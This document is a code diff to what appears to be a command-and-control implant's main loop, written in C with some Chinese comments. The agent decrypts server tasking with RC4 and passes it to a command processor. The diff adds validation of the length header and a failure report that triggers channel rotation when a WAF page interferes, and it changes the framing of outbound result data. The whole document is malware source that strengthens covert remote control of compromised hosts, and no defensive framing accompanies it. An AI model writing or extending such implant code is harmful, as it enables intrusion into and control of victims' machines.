@@ -50,7 +50,30 @@ void AgentMain()
 
 		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
 			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );
-			g_Agent->commander->ProcessCommandTasks( g_Connector->RecvData(), g_Connector->RecvSize(), packerOut );
+
+			// Protocol Validation: Check if the Little-Endian length header matches the actual buffer size
+			BOOL isValid = FALSE;
+			ULONG recvSize = g_Connector->RecvSize();
+			BYTE* recvData = g_Connector->RecvData();
+
+			if (recvSize >= 8) {
+				// Server sends length as Little Endian (see pl_agent.go: PackTasks)
+				ULONG packLen = recvData[0] | (recvData[1] << 8) | (recvData[2] << 16) | (recvData[3] << 24);
+				
+				// The server sends [LE_Len_4_Bytes][Payload...]. 
+				// Treat packet as valid only if declared payload length does not exceed actual buffer.
+				if (packLen > 0 && packLen <= (recvSize - 4)) {
+					isValid = TRUE;
+				}
+			}
+
+			if (isValid) {
+				g_Connector->ReportProtocolResult(TRUE);
+				g_Agent->commander->ProcessCommandTasks( recvData, recvSize, packerOut );
+			} else {
+				// Decryption resulted in garbage (likely a WAF page), trigger rotation
+				g_Connector->ReportProtocolResult(FALSE);
+			}
 		}
 		g_Connector->RecvClear();
 
@@ -285,18 +308,18 @@ void AgentMain()
 		if (packerOut->datasize() > 4) {
 			// 先写入原始长度头
 			packerOut->Set32(0, packerOut->datasize());
-
+		
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
-
-			// 会话层封装：[flags][orig_len_le][payload]
+		
+			// 会话层封装：[flags][orig_len_le][payload]，其中 payload 为完整 packer 缓冲，
+			// 包含原有的 4 字节长度头，以保持与 HTTP/TCP 等通道一致的上行格式。
 			BYTE* sessionBuf = NULL;
 			ULONG sessionLen = 0;
-
-			// 只对长度头之后的业务数据尝试压缩
-			BYTE* payload    = plainBuf + 4;
-			ULONG payloadLen = plainLen - 4;
-
+		
+			BYTE* payload    = plainBuf;
+			ULONG payloadLen = plainLen;
+		
 			BYTE* compBuf = NULL;
 			ULONG compLen = 0;
 			BYTE  flags   = 0;
